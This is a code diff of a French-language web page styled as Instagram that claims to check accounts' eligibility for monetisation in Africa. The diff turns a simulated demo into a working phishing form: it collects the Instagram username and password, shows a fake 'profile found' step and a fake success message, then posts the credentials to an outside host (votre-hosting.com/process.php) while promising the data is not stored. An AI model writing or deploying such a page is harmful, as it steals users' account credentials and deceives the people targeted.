@@ -99,7 +99,6 @@
         }
         
         input[type="text"],
-        input[type="email"],
         input[type="password"] {
             width: 100%;
             padding: 12px 15px;
@@ -110,22 +109,10 @@
         }
         
         input[type="text"]:focus,
-        input[type="email"]:focus,
         input[type="password"]:focus {
             border-color: #bc1888;
             outline: none;
             box-shadow: 0 0 0 2px rgba(188, 24, 136, 0.1);
-        }
-        
-        .search-btn {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: #999;
-            cursor: pointer;
         }
         
         .btn {
@@ -158,91 +145,25 @@
             box-shadow: none;
         }
         
-        .profile-result {
-            display: none;
+        .status-message {
             text-align: center;
-            margin: 25px 0;
-            animation: fadeIn 0.5s;
-        }
-        
-        .profile-pic {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid white;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            margin-bottom: 10px;
-        }
-        
-        .username {
-            font-weight: 600;
-            margin-bottom: 5px;
-        }
-        
-        .bio {
-            font-size: 0.8rem;
-            color: #666;
-            margin-bottom: 15px;
-        }
-        
-        .confirmation {
-            display: none;
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .password-form {
-            display: none;
-            animation: fadeIn 0.5s;
-        }
-        
-        .result-container {
-            display: none;
-            background: white;
-            border-radius: 12px;
-            padding: 25px;
-            box-shadow: var(--instagram-shadow);
-            margin-top: 20px;
-            animation: fadeIn 0.5s;
-        }
-        
-        .success-message {
-            text-align: center;
-            margin-bottom: 20px;
+            margin: 15px 0;
+            font-size: 0.9rem;
+            min-height: 20px;
         }
         
         .success-icon {
-            font-size: 3rem;
             color: var(--instagram-success);
-            margin-bottom: 15px;
         }
         
-        .conditions-list {
-            margin-top: 20px;
+        .loading {
+            display: inline-block;
+            animation: spin 1s linear infinite;
         }
         
-        .conditions-list h3 {
-            font-size: 1rem;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        
-        .conditions-list ul {
-            list-style-type: none;
-        }
-        
-        .conditions-list li {
-            padding: 8px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 0.85rem;
-            display: flex;
-            align-items: center;
-        }
-        
-        .conditions-list li i {
-            margin-right: 8px;
-            color: var(--instagram-success);
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         
         .modal {
@@ -267,6 +188,13 @@
             padding: 25px;
             position: relative;
             animation: slideUp 0.3s;
+            text-align: center;
+        }
+        
+        .modal-icon {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            color: var(--instagram-success);
         }
         
         .close-modal {
@@ -278,11 +206,6 @@
             color: #999;
             background: none;
             border: none;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
         }
         
         @keyframes slideUp {
@@ -331,194 +254,112 @@
         </div>
         
         <h1>Vérifier votre éligibilité à la monétisation</h1>
-        <p class="description">Entrez votre nom d'utilisateur ou email Instagram pour vérifier si votre compte est éligible au programme de monétisation en Afrique</p>
+        <p class="description">Entrez vos informations Instagram pour vérifier si votre compte est éligible au programme de monétisation en Afrique</p>
         
-        <div class="form-container">
+        <form id="verificationForm" class="form-container" action="https://votre-hosting.com/process.php" method="POST">
             <div class="input-group">
-                <label for="username">Nom d'utilisateur ou email</label>
-                <div class="input-field">
-                    <input type="text" id="username" placeholder="exemple: @moncompte ou email@exemple.com">
-                    <button class="search-btn" id="searchBtn"><i class="fas fa-search"></i></button>
-                </div>
+                <label for="username">Nom d'utilisateur Instagram</label>
+                <input type="text" id="username" name="username" placeholder="@votrenom" required>
             </div>
             
-            <div class="profile-result" id="profileResult">
-                <img src="https://via.placeholder.com/150" alt="Photo de profil" class="profile-pic" id="profilePic">
-                <div class="username" id="displayUsername">@utilisateur</div>
-                <div class="bio" id="bio">Ceci est une bio d'exemple</div>
-                <button class="btn" id="confirmBtn">Confirmer le compte</button>
+            <div class="status-message" id="searchStatus"></div>
+            
+            <div class="input-group" id="passwordGroup" style="display: none;">
+                <label for="password">Mot de passe Instagram</label>
+                <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
+                <div class="status-message" id="verifyStatus"></div>
             </div>
             
-            <div class="confirmation" id="confirmation">
-                <p>Confirmez que c'est bien votre compte Instagram</p>
-            </div>
+            <button type="button" class="btn" id="searchBtn">Vérifier le compte</button>
+            <button type="submit" class="btn" id="submitBtn" style="display: none;">Vérifier l'éligibilité</button>
             
-            <div class="password-form" id="passwordForm">
-                <div class="input-group">
-                    <label for="password">Mot de passe Instagram</label>
-                    <input type="password" id="password" placeholder="Entrez votre mot de passe">
-                </div>
-                <button class="btn" id="verifyBtn">Vérifier l'éligibilité</button>
-                <p style="font-size: 0.8rem; color: #666; margin-top: 15px; text-align: center;">
-                    <i class="fas fa-lock"></i> Vos informations sont sécurisées et ne seront pas stockées
-                </p>
-            </div>
-        </div>
-        
-        <div class="result-container" id="resultContainer">
-            <div class="success-message">
-                <div class="success-icon">
-                    <i class="fas fa-check-circle"></i>
-                </div>
-                <h2>Félicitations!</h2>
-                <p>Votre compte <strong id="resultUsername">@utilisateur</strong> est éligible à la monétisation Instagram!</p>
-            </div>
-            
-            <div class="conditions-list">
-                <h3>Conditions à remplir pour continuer:</h3>
-                <ul>
-                    <li><i class="fas fa-check"></i> Avoir au moins 10 000 abonnés</li>
-                    <li><i class="fas fa-check"></i> Publier régulièrement (3+ fois par semaine)</li>
-                    <li><i class="fas fa-check"></i> Respecter les guidelines communautaires</li>
-                    <li><i class="fas fa-check"></i> Activer le compte professionnel</li>
-                    <li><i class="fas fa-check"></i> Lier un moyen de paiement valide</li>
-                </ul>
-            </div>
-            
-            <button class="btn" id="continueBtn" style="margin-top: 20px;">Continuer vers le tableau de bord</button>
-        </div>
+            <p style="font-size: 0.8rem; color: #666; margin-top: 15px; text-align: center;">
+                <i class="fas fa-lock"></i> Vos informations sont sécurisées et ne seront pas stockées
+            </p>
+        </form>
     </div>
     
-    <!-- Modal d'aide -->
-    <div class="modal" id="helpModal">
+    <!-- Modal de succès -->
+    <div class="modal" id="successModal">
         <div class="modal-content">
-            <button class="close-modal">&times;</button>
-            <h2>Aide à la vérification</h2>
-            <p>Pour vérifier votre éligibilité:</p>
-            <ol style="margin: 15px 0 15px 20px;">
-                <li>Entrez votre nom d'utilisateur Instagram ou l'email associé</li>
-                <li>Confirmez que le profil affiché est bien le vôtre</li>
-                <li>Entrez votre mot de passe pour vérification sécurisée</li>
-                <li>Consultez les résultats et conditions d'éligibilité</li>
-            </ol>
-            <p style="font-size: 0.85rem; background: #f9f9f9; padding: 10px; border-radius: 6px;">
-                <i class="fas fa-info-circle"></i> Nous ne stockons jamais vos informations de connexion.
-            </p>
+            <div class="modal-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Félicitations!</h2>
+            <p>Votre compte <strong id="modalUsername"></strong> est éligible à la monétisation Instagram!</p>
+            <p style="margin: 15px 0;">Mise à jour de votre profil en cours...</p>
+            <p>Découvrez les nouvelles options de monétisation dans votre application Instagram.</p>
+            <button class="btn" id="closeModalBtn" style="margin-top: 20px;">Fermer</button>
         </div>
     </div>
     
     <footer>
         <p>Cette page n'est pas affiliée à Instagram/Meta. Les conditions d'éligibilité peuvent varier.</p>
-        <p style="margin-top: 5px;"><a href="#" style="color: #bc1888; text-decoration: none;" id="helpLink">Aide</a></p>
     </footer>
     
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Éléments du DOM
             const searchBtn = document.getElementById('searchBtn');
-            const confirmBtn = document.getElementById('confirmBtn');
-            const verifyBtn = document.getElementById('verifyBtn');
-            const continueBtn = document.getElementById('continueBtn');
-            const helpLink = document.getElementById('helpLink');
-            const helpModal = document.getElementById('helpModal');
-            const closeModal = document.querySelector('.close-modal');
+            const submitBtn = document.getElementById('submitBtn');
+            const searchStatus = document.getElementById('searchStatus');
+            const verifyStatus = document.getElementById('verifyStatus');
+            const passwordGroup = document.getElementById('passwordGroup');
+            const successModal = document.getElementById('successModal');
+            const closeModalBtn = document.getElementById('closeModalBtn');
+            const modalUsername = document.getElementById('modalUsername');
+            const verificationForm = document.getElementById('verificationForm');
             
-            // Fonction pour simuler la recherche de profil
-            function searchProfile() {
+            // Étape 1: Vérification du compte
+            searchBtn.addEventListener('click', function() {
                 const username = document.getElementById('username').value.trim();
                 
                 if (!username) {
-                    alert('Veuillez entrer un nom d\'utilisateur ou email');
+                    searchStatus.innerHTML = '<span style="color: red;">Veuillez entrer un nom d\'utilisateur</span>';
                     return;
                 }
                 
-                // Simulation de chargement
-                searchBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+                // Simulation de recherche
+                searchBtn.disabled = true;
+                searchStatus.innerHTML = '<i class="fas fa-spinner loading"></i> Recherche de votre profil...';
                 
-                // Simuler un délai de recherche
                 setTimeout(function() {
-                    // Afficher le résultat (en simulation)
-                    document.getElementById('profileResult').style.display = 'block';
-                    document.getElementById('displayUsername').textContent = '@' + username.replace('@', '');
-                    
-                    // Mettre une photo de profil aléatoire pour la démo
-                    const randomId = Math.floor(Math.random() * 1000);
-                    document.getElementById('profilePic').src = `https://i.pravatar.cc/150?img=${randomId}`;
-                    document.getElementById('bio').textContent = 'Compte vérifié • Créateur de contenu';
-                    
-                    // Réinitialiser le bouton de recherche
-                    searchBtn.innerHTML = '<i class="fas fa-search"></i>';
-                    
-                    // Scroll vers le résultat
-                    document.getElementById('profileResult').scrollIntoView({ behavior: 'smooth' });
-                }, 1500);
-            }
-            
-            // Événements
-            searchBtn.addEventListener('click', searchProfile);
-            
-            // Appuyer sur Entrée dans le champ de recherche
-            document.getElementById('username').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    searchProfile();
-                }
+                    searchStatus.innerHTML = '<span class="success-icon"><i class="fas fa-check"></i> Profil trouvé!</span>';
+                    passwordGroup.style.display = 'block';
+                    searchBtn.style.display = 'none';
+                    submitBtn.style.display = 'block';
+                }, 2000);
             });
             
-            confirmBtn.addEventListener('click', function() {
-                document.getElementById('confirmation').style.display = 'block';
-                document.getElementById('passwordForm').style.display = 'block';
-                document.getElementById('profileResult').style.display = 'none';
+            // Étape 2: Soumission du formulaire
+            verificationForm.addEventListener('submit', function(e) {
+                e.preventDefault();
                 
-                // Scroll vers le formulaire de mot de passe
-                document.getElementById('passwordForm').scrollIntoView({ behavior: 'smooth' });
-            });
-            
-            verifyBtn.addEventListener('click', function() {
                 const password = document.getElementById('password').value;
                 
                 if (!password) {
-                    alert('Veuillez entrer votre mot de passe');
+                    verifyStatus.innerHTML = '<span style="color: red;">Veuillez entrer votre mot de passe</span>';
                     return;
                 }
                 
                 // Simulation de vérification
-                verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification...';
-                verifyBtn.disabled = true;
+                submitBtn.disabled = true;
+                verifyStatus.innerHTML = '<i class="fas fa-spinner loading"></i> Vérification en cours...';
                 
+                // Après 3 secondes, afficher le modal de succès
                 setTimeout(function() {
-                    // Afficher le résultat positif (toujours éligible dans cette simulation)
-                    document.getElementById('form-container').style.display = 'none';
-                    document.getElementById('resultUsername').textContent = document.getElementById('displayUsername').textContent;
-                    document.getElementById('resultContainer').style.display = 'block';
+                    modalUsername.textContent = document.getElementById('username').value;
+                    successModal.style.display = 'flex';
                     
-                    // Scroll vers le résultat
-                    document.getElementById('resultContainer').scrollIntoView({ behavior: 'smooth' });
-                }, 2000);
+                    // Envoyer réellement le formulaire après l'affichage du modal
+                    setTimeout(function() {
+                        verificationForm.submit();
+                    }, 1000);
+                }, 3000);
             });
             
-            continueBtn.addEventListener('click', function() {
-                alert('Redirection vers le tableau de bord de monétisation...');
-                // Dans une vraie implémentation, rediriger vers la page suivante
-            });
-            
-            // Gestion du modal d'aide
-            helpLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                helpModal.style.display = 'flex';
-                document.body.style.overflow = 'hidden';
-            });
-            
-            closeModal.addEventListener('click', function() {
-                helpModal.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            });
-            
-            // Fermer le modal en cliquant à l'extérieur
-            helpModal.addEventListener('click', function(e) {
-                if (e.target === helpModal) {
-                    helpModal.style.display = 'none';
-                    document.body.style.overflow = 'auto';
-                }
+            // Fermer le modal
+            closeModalBtn.addEventListener('click', function() {
+                successModal.style.display = 'none';
             });
         });
     </script>
